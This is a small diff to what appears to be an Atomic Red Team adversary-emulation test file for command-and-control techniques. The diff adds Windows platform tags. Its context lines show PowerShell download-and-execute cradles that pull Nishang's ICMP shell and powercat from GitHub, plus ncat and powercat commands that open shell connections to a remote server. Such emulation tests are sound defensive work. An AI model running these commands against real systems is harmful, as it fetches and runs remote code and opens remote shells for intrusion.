@@ -18,6 +18,8 @@ atomic_tests:
       IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')
       Invoke-PowerShellIcmp -IPAddress #{server_ip}
     name: powershell
+  run_on:
+  - windows
 - name: Netcat C2
   auto_generated_guid: bcf0d1c1-3f6a-4847-b1c9-7ed4ea321f37
   description: |
@@ -63,6 +65,8 @@ atomic_tests:
     command: |
       cmd /c "#{ncat_exe}" #{server_ip} #{server_port}
     name: powershell
+  run_on:
+  - windows
 - name: Powercat C2
   auto_generated_guid: 3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e
   description: |
@@ -85,3 +89,5 @@ atomic_tests:
       IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')
       powercat -c #{server_ip} -p #{server_port}
     name: powershell
+  run_on:
+  - windows
